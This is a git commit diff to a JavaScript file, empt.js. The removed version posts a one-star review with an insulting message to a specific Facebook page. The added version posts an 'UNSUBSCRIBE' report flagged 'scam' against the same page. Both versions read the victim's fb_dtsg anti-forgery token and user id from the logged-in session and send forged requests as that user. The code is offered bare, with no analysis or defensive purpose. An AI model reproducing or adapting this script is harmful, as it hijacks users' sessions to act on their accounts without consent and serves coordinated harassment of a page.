3dd20150156656fdd6dd6ee50fd2ddf799bd28fb
elmahbol <elmahbol@users.noreply.github.com>
2016-03-22 18:14:14 +0200

    Update empt.js

--- empt.js
+++ empt.js
@@ -1,11 +1,10 @@
-
-var X = new XMLHttpRequest();
-var XURL = "//www.facebook.com/ajax/pages/review/add?mechanism=inline_rating&send_reviews_feed_markup=1&__pc=EXP1%3ADEFAULT";
-var XParams = "&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"%3AAQHw-nU4gS90&id=289226391273473&ref=page_review_tab&id_to_replace=&source=11&rating=1&note_message=Worst%20trip%20and%20worst%20organizers%20ever%0APlease%20Do%20not%20ever%20use%20and%20better%20to%20report%20this%20useless%20page%20as%20well%0A&audience[8787770733][value]=80&done_button=1&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&__dyn=&__req=&ttstamp=";
-X.open("POST", XURL, true);
-X.onreadystatechange = function () {
-if (X.readyState == 4 && X.status == 200) {
-X.close;
-}
-};
-X.send(XParams);
+ var X = new XMLHttpRequest();
+  var XURL = "//www.facebook.com/ajax/feed/filter_action/nfx_action_execute?__pc=EXP1%3ADEFAULT&dpr=1";
+  var XParams = "&confirmed=1&action_name=UNSUBSCRIBE&context=%7B%22breadcrumbs%22%3A[%22scam%22]%2C%22story_location%22%3A%22page%22%2C%22is_from_feed_tombstone%22%3Afalse%2C%22actions_taken%22%3A%22%22%2C%22reportable_ent_token%22%3A%22289226391273473%22%2C%22is_impostor%22%3A%22%22%7D&av="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&__dyn=aKTyAW8-aloAwmgDDzbHaF8x9xq9AGUZz8-8mAdyemkyrWqGmcXmnxnCWyWGaxuifhKagByAp2WCGq5aykfCK49FGwwz8KFUgCkwy48G5WAzHBApuVWxeUlAzV-ElDgSuuazF9VQimmu6rCz9qBh8Cmexvz8-cx2qt38x5GUOeiyE&__req=p&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=&__rev=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
